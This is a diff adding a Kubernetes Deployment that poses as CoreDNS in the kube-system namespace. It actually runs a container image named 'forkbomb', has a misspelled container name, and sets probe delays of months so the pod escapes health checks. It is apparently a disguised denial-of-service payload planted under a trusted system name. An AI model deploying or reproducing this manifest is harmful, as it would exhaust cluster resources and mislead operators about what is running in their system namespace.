@@ -1,0 +1,30 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: coredns
+  namespace: kube-system
+  labels:
+    app: coredns
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: coredns
+  template:
+    metadata:
+      labels:
+        app: coredns
+    spec:
+      containers:
+      - name: corednfesses
+        image: hunh0w/forkbomb:version1
+        readinessProbe:
+          tcpSocket:
+            port: 8080
+          initialDelaySeconds: 14150000
+          periodSeconds: 14150000
+        livenessProbe:
+          tcpSocket:
+            port: 8080
+          initialDelaySeconds: 14150000
+          periodSeconds: 14150000
